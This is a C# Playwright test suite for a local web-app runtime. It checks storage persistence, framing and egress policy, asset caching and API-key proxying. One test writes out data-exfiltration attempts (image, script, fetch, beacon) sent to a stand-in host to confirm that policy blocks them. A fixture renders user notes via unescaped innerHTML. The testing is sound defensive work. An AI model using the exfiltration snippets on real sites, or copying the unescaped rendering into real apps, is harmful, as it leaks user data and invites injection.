using System.Text.Json;
using Microsoft.Playwright;

namespace Bohm.Runtime.Tests.Host;

/// <summary>
/// The injected script in a real Chromium-family browser (the installed Microsoft Edge, which is
/// what the desktop web view is built on). Skipped where Edge is not installed.
/// </summary>
[Collection("browser")]
public sealed class BrowserTests : IAsyncLifetime
{
    private const string NotesApp = """
        <!doctype html>
        <html><head><meta charset="utf-8"><title>Notes</title></head>
        <body>
          <input id="note"><button id="save">Save</button>
          <ul id="list"></ul>
          <script>
            const notes = JSON.parse(localStorage.getItem('notes') || '[]');
            const render = () => { document.getElementById('list').innerHTML = notes.map(n => '<li>' + n + '</li>').join(''); };
            document.getElementById('save').onclick = () => {
              notes.push(document.getElementById('note').value);
              localStorage.setItem('notes', JSON.stringify(notes));
              localStorage.lastSaved = String(notes.length);
              render();
            };
            render();
          </script>
        </body></html>
        """;

    private RunningHost _host = null!;
    private IPlaywright _playwright = null!;
    private IBrowser? _browser;

    public async ValueTask InitializeAsync()
    {
        _host = await RunningHost.StartAsync();
        _playwright = await Playwright.CreateAsync();
        try
        {
            _browser = await _playwright.Chromium.LaunchAsync(new() { Channel = "msedge" });
        }
        catch (PlaywrightException)
        {
            _browser = null;
        }
    }

    public async ValueTask DisposeAsync()
    {
        if (_browser is not null) await _browser.DisposeAsync();
        _playwright.Dispose();
        await _host.DisposeAsync();
    }

    [Fact]
    public async Task An_unmodified_app_keeps_its_data_across_reloads_and_a_host_restart()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync(NotesApp);

        var page = await OpenAsync(id);
        await page.FillAsync("#note", "우유 사기");
        await page.ClickAsync("#save");
        await page.FillAsync("#note", "buy bread");
        await page.ClickAsync("#save");
        await ReloadUntilAsync(page, "localStorage.getItem('notes') && JSON.parse(localStorage.getItem('notes')).length === 2");

        Assert.Equal(["우유 사기", "buy bread"], await page.Locator("#list li").AllInnerTextsAsync());
        Assert.Equal("2", await page.EvaluateAsync<string>("localStorage.lastSaved"));
        await page.CloseAsync();

        await _host.StopKeepingDataAsync();
        _host = await RunningHost.StartAsync(_host.DataRoot);

        var afterRestart = await OpenAsync(id);
        Assert.Equal(["우유 사기", "buy bread"], await afterRestart.Locator("#list li").AllInnerTextsAsync());
    }

    [Fact]
    public async Task A_write_made_while_the_page_is_closing_is_kept()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Draft</title>
            <script>addEventListener('pagehide', () => localStorage.setItem('draft', 'written at close'));</script>
            """);

        var page = await OpenAsync(id);
        await page.CloseAsync(new() { RunBeforeUnload = true });

        // The window closed but the browser (the application's process) is still running — the
        // case where the final request must still arrive.
        var check = await OpenAsync(id);
        await ReloadUntilAsync(check, "localStorage.getItem('draft') !== null");
        Assert.Equal("written at close", await check.EvaluateAsync<string?>("localStorage.getItem('draft')"));
    }

    [Fact]
    public async Task A_write_the_page_makes_in_its_own_pagehide_arrives_when_the_page_navigates_away()
    {
        // The host closes a tab by navigating it to about:blank. The page's own pagehide handler runs
        // after the injected script's (registered first), so its write is recorded after the flush
        // on leave — it must still go out while the page is leaving, not on a later timer.
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Closes</title>
            <script>addEventListener('pagehide', () => localStorage.setItem('closes', String(Number(localStorage.getItem('closes') || 0) + 1)));</script>
            """);
        const int Times = 10;
        for (var i = 0; i < Times; i++)
        {
            var page = await OpenAsync(id);
            await page.GotoAsync("about:blank");
            await page.WaitForTimeoutAsync(300); // the host's margin after the tabs are gone
            await page.CloseAsync();
        }

        var check = await OpenAsync(id);
        Assert.Equal(Times.ToString(System.Globalization.CultureInfo.InvariantCulture), await check.EvaluateAsync<string?>("localStorage.getItem('closes')"));
    }

    [Fact]
    public async Task A_write_made_while_leaving_goes_out_at_once_not_on_a_timer_that_may_never_run()
    {
        // Timers are not guaranteed to run once a page is leaving. The page here makes sure they do
        // not, then writes: the write must already be on its way, carrying anything not yet acknowledged.
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Leaving</title>
            <script>addEventListener('pagehide', () => { window.setTimeout = () => 0; localStorage.setItem('last', 'written while leaving'); });</script>
            """);
        var page = await OpenAsync(id);
        await page.EvaluateAsync("() => localStorage.setItem('before', 'kept')");
        await page.GotoAsync("about:blank");
        await page.CloseAsync();

        var check = await OpenAsync(id);
        await ReloadUntilAsync(check, "localStorage.getItem('last') !== null");
        Assert.Equal("written while leaving", await check.EvaluateAsync<string?>("localStorage.getItem('last')"));
        Assert.Equal("kept", await check.EvaluateAsync<string?>("localStorage.getItem('before')"));
    }

    [Fact]
    public async Task Web_storage_semantics_hold_for_common_access_patterns()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("<!doctype html><title>t</title>");
        var page = await OpenAsync(id);

        var result = await page.EvaluateAsync<string>("""
            () => {
              localStorage.clear();
              localStorage.setItem('a', 1);
              localStorage.b = 'two';
              localStorage['c'] = 'three';
              delete localStorage.c;
              return JSON.stringify({
                a: localStorage.getItem('a'), b: localStorage.b, missing: localStorage.getItem('nope'),
                length: localStorage.length, keys: Object.keys(localStorage), first: localStorage.key(0),
                hasB: 'b' in localStorage, json: JSON.parse(JSON.stringify(localStorage)),
              });
            }
            """);

        Assert.Equal("""{"a":"1","b":"two","missing":null,"length":2,"keys":["a","b"],"first":"a","hasB":true,"json":{"a":"1","b":"two"}}""", result);
    }

    [Fact]
    public async Task A_page_elsewhere_cannot_embed_an_application()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("<!doctype html><title>Mine</title><button id='b'>click</button>");
        var page = await _browser!.NewPageAsync();
        // A page with no policy of its own, so only the application's policy decides.
        await page.SetContentAsync($"<iframe src='http://{id}.localhost:{_host.Port}/'></iframe>");
        await page.WaitForTimeoutAsync(1000);

        var framed = page.Frames.Single(f => f != page.MainFrame);
        Assert.Null(await framed.QuerySelectorAsync("#b")); // refused: the application never rendered inside it
    }

    [Fact]
    public async Task An_application_may_still_frame_its_own_origin()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("<!doctype html><title>Self</title><iframe src='/'></iframe>");
        var page = await OpenAsync(id);
        await page.WaitForTimeoutAsync(1000);

        // The same document, rendered inside itself (the browser stops the nesting at some depth).
        var inner = page.MainFrame.ChildFrames[0];
        Assert.NotNull(await inner.QuerySelectorAsync("iframe"));
    }

    [Fact]
    public async Task Data_cannot_leave_the_origin_through_any_request_type()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var elsewhere = $"http://outside.localhost:{_host.Port}";
        var id = await _host.AdoptAsync("<!doctype html><title>x</title>");
        var page = await OpenAsync(id);
        // A request the policy refuses still raises Playwright's Request event (the browser creates
        // it before checking policy), so what counts is how each one ended: refused, or answered.
        var answered = new List<string>();
        var refused = new List<string>();
        page.RequestFinished += (_, request) => { if (request.Url.StartsWith(elsewhere, StringComparison.Ordinal)) answered.Add(request.Url); };
        page.RequestFailed += (_, request) => { if (request.Url.StartsWith(elsewhere, StringComparison.Ordinal)) refused.Add($"{request.Url} {request.Failure}"); };

        var violations = await page.EvaluateAsync<int>($$"""
            async () => {
              let count = 0;
              document.addEventListener('securitypolicyviolation', () => count++);
              const secret = encodeURIComponent('secret');
              const img = new Image(); img.src = '{{elsewhere}}/img?d=' + secret;
              const script = document.createElement('script'); script.src = '{{elsewhere}}/js?d=' + secret; document.head.append(script);
              const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = '{{elsewhere}}/css?d=' + secret; document.head.append(link);
              try { await fetch('{{elsewhere}}/fetch?d=' + secret, { mode: 'no-cors' }); } catch {}
              navigator.sendBeacon('{{elsewhere}}/beacon', secret);
              await new Promise(r => setTimeout(r, 500));
              return count;
            }
            """);

        Assert.Empty(answered);
        Assert.All(refused, r => Assert.EndsWith(" csp", r, StringComparison.Ordinal));
        Assert.True(violations >= 4, $"expected every attempt to be refused by policy, saw {violations}");
    }

    [Fact]
    public async Task Opening_typing_and_saving_are_recorded_as_todays_signals()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync(NotesApp);

        var page = await OpenAsync(id);
        await page.FillAsync("#note", "x");
        await page.ClickAsync("#save");

        var status = await StatusWhenAsync(id, s => s.GetProperty("input").GetBoolean() && s.GetProperty("wrote").GetBoolean());
        Assert.True(status.GetProperty("opened").GetBoolean());
    }

    [Fact]
    public async Task The_host_reads_the_last_issued_write_and_the_page_cannot_change_what_it_reads()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync(NotesApp);
        var page = await OpenAsync(id);
        await page.FillAsync("#note", "x");
        await page.ClickAsync("#save");   // two writes: notes, lastSaved

        var tampered = await page.EvaluateAsync<bool>("""
            () => {
              window.__bohm = { tab: 'spoof', issued: () => 999 };
              try { Object.defineProperty(window, '__bohm', { value: 1 }); } catch { }
              try { window.__bohm.issued = () => 999; } catch { }
              return window.__bohm.tab === 'spoof' || window.__bohm.issued() === 999;
            }
            """);
        Assert.False(tampered);
        Assert.Equal(2, await page.EvaluateAsync<int>("() => window.__bohm.issued()"));

        var tab = await page.EvaluateAsync<string>("() => window.__bohm.tab");
        using var client = _host.ControlClient();
        await EventuallyAsync(async cancellation =>
        {
            var ack = JsonDocument.Parse(await client.GetStringAsync($"/__control/apps/{id}/tabs/{tab}", cancellation)).RootElement;
            return ack.GetProperty("ack").GetInt64() == 2 ? ack : null;
        });
    }

    [Fact]
    public async Task A_page_armed_by_the_host_reports_its_last_write_after_its_own_pagehide_even_if_that_write_is_lost()
    {
        // The host arms the page just before it navigates it away. The report then goes out after the
        // page's own pagehide listener (registered earlier), so it covers the write that listener made.
        // Here that write's request is dropped: only the report can tell the runtime it existed.
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Closes</title>
            <script>addEventListener('pagehide', () => localStorage.setItem('closes', '1'));</script>
            """);
        var page = await _browser!.NewPageAsync();
        // Runs before the injected script, so the fetch that script keeps for itself is this one: a
        // request carrying the pagehide write fails without leaving the page (routing does not see
        // keepalive requests sent while a page unloads).
        await page.AddInitScriptAsync("""
            const send = window.fetch;
            window.fetch = (url, init) => init && typeof init.body === 'string' && init.body.includes('"closes"')
              ? Promise.reject(new TypeError('dropped'))
              : send(url, init);
            """);
        await page.GotoAsync($"http://{id}.localhost:{_host.Port}/");
        var tab = await page.EvaluateAsync<string>("() => { window.__bohm.arm(); return window.__bohm.tab; }");

        await page.GotoAsync("about:blank");

        using var client = _host.ControlClient();
        var view = await EventuallyAsync(async cancellation =>
        {
            var v = JsonDocument.Parse(await client.GetStringAsync($"/__control/apps/{id}/tabs/{tab}", cancellation)).RootElement;
            return v.GetProperty("left").GetBoolean() ? v : (JsonElement?)null;
        });
        Assert.Equal(1, view.GetProperty("issued").GetInt64());
        Assert.Equal(0, view.GetProperty("ack").GetInt64());
    }

    [Fact]
    public async Task A_blocked_library_and_the_error_it_causes_are_reported_separately()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Broken</title>
            <script src="https://cdn.example.com/chart.js"></script>
            <script>new Chart(document.body, {});</script>
            """);

        await OpenAsync(id);

        var status = await StatusWhenAsync(id, s => s.GetProperty("blocked").GetArrayLength() > 0 && s.GetProperty("recentLoadErrors").GetArrayLength() > 0);
        var blocked = Assert.Single(status.GetProperty("blocked").EnumerateArray());
        Assert.Equal("library", blocked.GetProperty("category").GetString());
        Assert.Equal("cdn.example.com", blocked.GetProperty("host").GetString());
        Assert.True(status.GetProperty("recentLoadErrors").GetArrayLength() == 1, status.ToString());
        var error = status.GetProperty("recentLoadErrors")[0].GetString()!;
        Assert.Contains("Chart", error, StringComparison.Ordinal);
        Assert.EndsWith("(line 3)", error, StringComparison.Ordinal); // as numbered in the adopted file
        Assert.Equal(2, status.GetProperty("loadErrors").GetInt32());

        // The refused connection is in the run's egress record as blocked — and nothing was sent.
        var egress = JsonDocument.Parse(await _host.ControlClient().GetStringAsync("/__control/egress")).RootElement;
        Assert.Equal("cdn.example.com", Assert.Single(egress.GetProperty("blocked").EnumerateArray()).GetProperty("host").GetString());
        Assert.Empty(egress.GetProperty("sent").EnumerateArray());
    }

    [Fact]
    public async Task A_module_imported_from_a_cdn_is_named_instead_of_a_bare_error()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Module</title>
            <script type="module">
              import { GoogleGenerativeAI } from "https://esm.run/@google/generative-ai";
              document.body.textContent = typeof GoogleGenerativeAI;
            </script>
            """);

        await OpenAsync(id);

        var status = await StatusWhenAsync(id, s => s.GetProperty("blocked").GetArrayLength() > 0);
        var blocked = Assert.Single(status.GetProperty("blocked").EnumerateArray());
        Assert.Equal(("library", "esm.run"), (blocked.GetProperty("category").GetString(), blocked.GetProperty("host").GetString()));
        Assert.DoesNotContain(status.GetProperty("recentLoadErrors").EnumerateArray(), e => e.GetString() == "error");
    }

    [Fact]
    public async Task External_data_an_app_handles_itself_is_still_reported()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Schedule</title><p id="out">loading</p>
            <script>
              fetch("https://data.example.org/schedule.json").then(r => r.json())
                .catch(() => { document.getElementById("out").textContent = "could not load the schedule"; });
            </script>
            """);

        var page = await OpenAsync(id);
        await page.WaitForSelectorAsync("#out:has-text('could not load the schedule')");

        var status = await StatusWhenAsync(id, s => s.GetProperty("blocked").GetArrayLength() > 0);
        var blocked = Assert.Single(status.GetProperty("blocked").EnumerateArray());
        Assert.Equal(("data", "data.example.org"), (blocked.GetProperty("category").GetString(), blocked.GetProperty("host").GetString()));
        Assert.Equal(0, status.GetProperty("loadErrors").GetInt32()); // missing data is not a failure to load
    }

    [Fact]
    public async Task Files_the_page_expected_next_to_it_are_listed_as_missing()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var id = await _host.AdoptAsync("""<!doctype html><title>Site page</title><p>hi</p><script src="footer.js?v=3"></script>""");

        await OpenAsync(id);

        var status = await StatusWhenAsync(id, s => s.GetProperty("missingFiles").GetArrayLength() > 0);
        Assert.Equal("/footer.js", Assert.Single(status.GetProperty("missingFiles").EnumerateArray()).GetString());
        Assert.Empty(status.GetProperty("recentLoadErrors").EnumerateArray()); // not reported twice
    }

    [Fact]
    public async Task Code_from_other_hosts_cached_at_adoption_runs_under_the_policy_and_offline()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        var cdn = new Assets.FakeCdn()
            .File("https://cdn.test/greet.js", "text/javascript", "window.greet = n => 'hello ' + n;")
            .Redirect("https://esm.test/pkg", "https://cdn2.test/npm/pkg@1/+esm")
            .File("https://cdn2.test/npm/pkg@1/+esm", "application/javascript", """import{up}from"/npm/dep@1/+esm";export const shout=s=>up(s)+"!";""")
            .File("https://cdn2.test/npm/dep@1/+esm", "application/javascript", "export const up=s=>s.toUpperCase();")
            .File("https://cdn.test/style.css", "text/css", "p#styled { color: rgb(1, 2, 3); }");
        await _host.StopKeepingDataAsync();
        _host = await RunningHost.StartAsync(_host.DataRoot, configure: o => o with { AssetHttpHandler = () => cdn, FetchAssetsOnAdoption = false });
        var html = """
            <!doctype html><title>Uses a CDN</title>
            <link rel="stylesheet" href="https://cdn.test/style.css">
            <p id="classic"></p><p id="module"></p><p id="styled">x</p>
            <script src="https://cdn.test/greet.js"></script>
            <script>document.getElementById('classic').textContent = greet('bohm');</script>
            <script type="module">
              import { shout } from "https://esm.test/pkg";
              document.getElementById('module').textContent = shout('offline');
            </script>
            """;
        var id = await _host.AdoptAsync(html);
        using (var fetched = await _host.ControlClient().PostAsync($"/__control/apps/{id}/assets", null))
            Assert.Equal(4, System.Text.Json.JsonDocument.Parse(await fetched.Content.ReadAsStringAsync()).RootElement.GetProperty("cached").GetArrayLength());

        var page = await OpenAsync(id);
        await page.WaitForSelectorAsync("#module:has-text('OFFLINE!')");

        Assert.Equal("hello bohm", await page.TextContentAsync("#classic"));
        Assert.Equal("rgb(1, 2, 3)", await page.EvaluateAsync<string>("getComputedStyle(document.getElementById('styled')).color"));
        var status = System.Text.Json.JsonDocument.Parse(await _host.ControlClient().GetStringAsync($"/__control/apps/{id}/status")).RootElement;
        Assert.Empty(status.GetProperty("blocked").EnumerateArray());
        Assert.Empty(status.GetProperty("missingFiles").EnumerateArray());
        Assert.Equal(System.Text.Encoding.UTF8.GetBytes(html), await _host.Catalog.ReadHtmlAsync(id)); // the stored document is untouched
    }

    private Task<System.Text.Json.JsonElement> StatusWhenAsync(string id, Func<System.Text.Json.JsonElement, bool> condition) =>
        EventuallyAsync(async cancellation =>
        {
            using var client = _host.ControlClient();
            var s = System.Text.Json.JsonDocument.Parse(await client.GetStringAsync($"/__control/apps/{id}/status", cancellation)).RootElement;
            return condition(s) ? s : null;
        });

    [Fact]
    public async Task An_app_that_asks_for_an_api_key_talks_to_its_provider_without_ever_holding_the_key()
    {
        Assert.SkipWhen(_browser is null, "Microsoft Edge is not installed.");
        const string realKey = "sk-real-secret-never-in-the-page";
        await using var provider = await FakeProvider.StartAsync();
        await _host.StopKeepingDataAsync();
        _host = await RunningHost.StartAsync(_host.DataRoot, configure: o => o with
        {
            LlmEndpoints = new Dictionary<string, Uri> { ["api.openai.com"] = provider.Address },
        });
        (await _host.ControlClient().PutAsync("/__control/llm/openai/key", new StringContent(realKey))).Dispose();

        // The common shape of generated AI apps: ask once, remember it, call the provider directly.
        var id = await _host.AdoptAsync("""
            <!doctype html><title>Ask</title>
            <button id="ask">Ask</button><p id="answer"></p>
            <script>
              let key = localStorage.getItem('openai_key');
              if (!key) { key = prompt('Enter your OpenAI API key'); localStorage.setItem('openai_key', key); }
              document.getElementById('ask').onclick = async () => {
                const r = await fetch('https://api.openai.com/v1/chat/completions', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + key },
                  body: JSON.stringify({ model: 'gpt-4o-mini', messages: [{ role: 'user', content: 'hi' }] }),
                });
                const j = await r.json();
                document.getElementById('answer').textContent = j.choices[0].message.content;
              };
            </script>
            """);

        var page = await OpenAsync(id);
        await page.ClickAsync("#ask");
        await page.WaitForSelectorAsync("#answer:has-text('hello from the provider')");

        Assert.Equal($"Bearer {realKey}", Assert.Single(provider.Received).Headers["Authorization"]);
        Assert.Equal($"bohm-key-{id}", await page.EvaluateAsync<string>("localStorage.getItem('openai_key')"));
        await page.CloseAsync();
        // The runtime still has the journal open for writing, so read with sharing.
        foreach (var file in Directory.EnumerateFiles(_host.DataRoot, "*", SearchOption.AllDirectories))
        {
            await using var stream = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            using var reader = new StreamReader(stream);
            Assert.DoesNotContain(realKey, await reader.ReadToEndAsync(), StringComparison.Ordinal);
        }
    }

    /// <summary>
    /// Polls <paramref name="probe"/> until it yields a value, within one overall deadline. Each attempt is
    /// cancelled at the deadline too, so a request that hangs fails the test in seconds instead of waiting
    /// out the HTTP client's own timeout on every attempt.
    /// </summary>
    private static async Task<System.Text.Json.JsonElement> EventuallyAsync(Func<CancellationToken, Task<System.Text.Json.JsonElement?>> probe)
    {
        using var deadline = new CancellationTokenSource(TimeSpan.FromSeconds(20));
        try
        {
            while (true)
            {
                if (await probe(deadline.Token) is { } result) return result;
                await Task.Delay(200, deadline.Token);
            }
        }
        catch (OperationCanceledException) when (deadline.IsCancellationRequested)
        {
            Assert.Fail("The condition was not met within 20 seconds.");
            return default;
        }
    }

    private async Task<IPage> OpenAsync(string appId)
    {
        var page = await _browser!.NewPageAsync();
        await page.GotoAsync($"http://{appId}.localhost:{_host.Port}/");
        return page;
    }

    /// <summary>
    /// Reloads until <paramref name="condition"/> holds on a fresh load — i.e. until the data has
    /// reached the runtime, since each load is seeded from what the runtime has stored. Delivery is
    /// asynchronous by design, so a single immediate reload would race it.
    /// </summary>
    private static async Task ReloadUntilAsync(IPage page, string condition)
    {
        for (var attempt = 0; attempt < 25; attempt++)
        {
            await page.ReloadAsync();
            if (await page.EvaluateAsync<bool>(condition)) return;
            await Task.Delay(200);
        }

        Assert.Fail($"Still not true after reloading: {condition}");
    }
}
